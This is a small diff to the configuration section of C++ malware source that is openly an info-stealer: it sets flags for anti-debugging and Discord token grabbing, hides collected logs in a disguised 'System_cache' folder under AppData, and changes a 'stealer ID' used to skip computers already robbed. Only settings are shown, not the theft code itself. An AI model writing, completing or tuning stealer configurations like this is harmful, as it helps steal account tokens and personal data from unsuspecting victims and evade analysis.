@@ -32,5 +32,5 @@ namespace config {
 	const bool debuging = false; // disable AntiDebug (do not change if you do not know what it is responsible for)
 	const bool dsTokenGrab = false; // garb tokens from discord (increase the duration of the program about 10 mins)
 	const std::string path = "/AppData/Local/System_cache"; // path to logs
-	const std::string yourStealerId = "";//id that is used to avoid restarting on a computer from which logs have already been taken
+	const char yourStealerId[10] = "Vinesmoke";//id that is used to avoid restarting on a computer from which logs have already been taken
 }
